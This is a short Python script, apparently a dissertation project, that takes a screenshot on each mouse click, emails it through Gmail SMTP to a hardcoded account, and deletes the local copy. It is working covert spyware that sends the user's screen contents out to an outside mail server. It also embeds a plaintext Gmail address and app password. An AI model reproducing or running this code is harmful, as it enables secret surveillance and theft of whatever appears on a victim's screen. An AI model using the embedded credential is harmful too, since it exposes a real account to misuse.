import pynput
from pynput import mouse
from pynput.mouse import Listener
import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import os

def on_click(x, y, button, pressed):
    if pressed: sendEmail()

def sendEmail(): #Creates email
    password = "gdkljcdmlxkehbty"
    email = "dissertationkeylogger@gmail.com"
    file = "imageForDiss2.png" #Image name
    #connects to gmail with secure socket layer
    server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465) 
    server.login(email, password) #Logs in
    emailMes = EmailMessage() #Message
    emailMes["from"], emailMes["to"] = email, email
    pyautogui.screenshot(file) #image = screenshot
    with open(file, "rb") as f: #Reads image
        imData = f.read()
    #Adds image to email
    emailMes.add_attachment(imData, maintype = "image", subtype = imghdr.what(f.name), filename = file) 
    f.close()
    os.remove(file)
    server.send_message(emailMes)
    server.quit() #Closes when used and unnecessary

with mouse.Listener(on_click=on_click) as listener:
    listener.join()
